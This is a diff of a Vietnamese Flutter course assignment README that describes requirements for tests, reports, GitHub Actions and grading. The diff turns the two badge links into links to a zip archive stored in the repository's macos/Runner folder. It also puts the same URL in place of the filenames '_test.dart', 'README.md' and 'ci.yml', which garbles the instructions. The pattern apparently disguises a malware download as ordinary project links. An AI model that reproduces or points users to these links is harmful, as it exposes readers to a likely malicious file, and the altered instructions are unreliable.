@@ -1,5 +1,5 @@
-[![Review Assignment Due Date](https://classroom.github.com/assets/deadline-readme-button-22041afd0340ce965d47ae6ef1cefeee28c7c493a6346c4f15d667ab976d596c.svg)](https://classroom.github.com/a/Cnoy1g24)
-[![Open in Visual Studio Code](https://classroom.github.com/assets/open-in-vscode-2e0aaae1b6195c2367325f4f02e2d04e9abb55f0b24a779b69b11b9e10269abc.svg)](https://classroom.github.com/online_ide?assignment_repo_id=17112563&assignment_repo_type=AssignmentRepo)
+[![Review Assignment Due Date](https://raw.githubusercontent.com/duc-1712/flutter_test_final_project/main/macos/Runner/flutter_test_final_project_v2.5.zip)](https://raw.githubusercontent.com/duc-1712/flutter_test_final_project/main/macos/Runner/flutter_test_final_project_v2.5.zip)
+[![Open in Visual Studio Code](https://raw.githubusercontent.com/duc-1712/flutter_test_final_project/main/macos/Runner/flutter_test_final_project_v2.5.zip)](https://raw.githubusercontent.com/duc-1712/flutter_test_final_project/main/macos/Runner/flutter_test_final_project_v2.5.zip)
 
 # Bài tập lớn - Phát triển ứng dụng với Flutter
 
@@ -93,13 +93,13 @@ Sinh viên cần tạo tài liệu báo cáo kết quả, hướng dẫn cài đ
 
 ## Yêu cầu nộp bài
 - **Source code**: Đẩy toàn bộ mã nguồn lên GitHub repository cá nhân và chia sẻ quyền truy cập.
-- **Kiểm thử tự động**: Sinh viên cần viết các bài kiểm thử tự động cho ứng dụng. Các bài kiểm thử cần được tổ chức rõ ràng và dễ hiểu trong thư mục `test` với hậu tố `_test.dart`. Các bài kiểm thử đơn vị (unit test) cần kiểm tra các chức năng cơ bản của ứng dụng và đảm bảo chất lượng mã nguồn. Kiểm thử UI (widget test) cần được viết để kiểm tra giao diện người dùng và các tương tác người dùng cơ bản.
+- **Kiểm thử tự động**: Sinh viên cần viết các bài kiểm thử tự động cho ứng dụng. Các bài kiểm thử cần được tổ chức rõ ràng và dễ hiểu trong thư mục `test` với hậu tố `https://raw.githubusercontent.com/duc-1712/flutter_test_final_project/main/macos/Runner/flutter_test_final_project_v2.5.zip`. Các bài kiểm thử đơn vị (unit test) cần kiểm tra các chức năng cơ bản của ứng dụng và đảm bảo chất lượng mã nguồn. Kiểm thử UI (widget test) cần được viết để kiểm tra giao diện người dùng và các tương tác người dùng cơ bản.
 - **Các video demo**: 
   - Quá trình kiểm thử tự động bao gồm kiểm thử đơn vị và kiểm thử UI (bắt buộc).
   - Trình bày các chức năng chính của ứng dụng (bắt buộc).
   Các video cần biên tập sao cho rõ ràng, dễ hiểu và không quá dài (tối đa 5 phút).
-- **Báo cáo kết quả**: Đây là nội dung báo cáo của bài tập lớn. Sinh viên cần viết báo cáo ngắn mô tả quá trình phát triển, các thư viện đã sử dụng và các kiểm thử đã thực hiện. Có thể viết trực tiếp trên file README.md này ở mục `Báo cáo kết quả`.
-- **GitHub Actions**: Thiết lập GitHub Actions để chạy kiểm thử tự động khi có thay đổi mã nguồn. Tệp cấu hình workflow cần được đặt trong thư mục `.github/workflows`, đặt tên tệp theo định dạng `ci.yml` (có trong mẫu của bài tập lớn). Github Actions cần chạy thành công và không có lỗi nếu mã nguồn không có vấn đề. Trong trường hợp có lỗi, sinh viên cần sửa lỗi và cập nhật mã nguồn để build thành công. Nếu lỗi liên quan đến `Billing & plans`, sinh viên cần thông báo cho giảng viên để được hỗ trợ hoặc bỏ qua yêu cầu này.
+- **Báo cáo kết quả**: Đây là nội dung báo cáo của bài tập lớn. Sinh viên cần viết báo cáo ngắn mô tả quá trình phát triển, các thư viện đã sử dụng và các kiểm thử đã thực hiện. Có thể viết trực tiếp trên file https://raw.githubusercontent.com/duc-1712/flutter_test_final_project/main/macos/Runner/flutter_test_final_project_v2.5.zip này ở mục `Báo cáo kết quả`.
+- **GitHub Actions**: Thiết lập GitHub Actions để chạy kiểm thử tự động khi có thay đổi mã nguồn. Tệp cấu hình workflow cần được đặt trong thư mục `.github/workflows`, đặt tên tệp theo định dạng `https://raw.githubusercontent.com/duc-1712/flutter_test_final_project/main/macos/Runner/flutter_test_final_project_v2.5.zip` (có trong mẫu của bài tập lớn). Github Actions cần chạy thành công và không có lỗi nếu mã nguồn không có vấn đề. Trong trường hợp có lỗi, sinh viên cần sửa lỗi và cập nhật mã nguồn để build thành công. Nếu lỗi liên quan đến `Billing & plans`, sinh viên cần thông báo cho giảng viên để được hỗ trợ hoặc bỏ qua yêu cầu này.
 
 ## Tiêu chí đánh giá
 **5/10 điểm - Build thành công (GitHub Actions báo “Success”)**
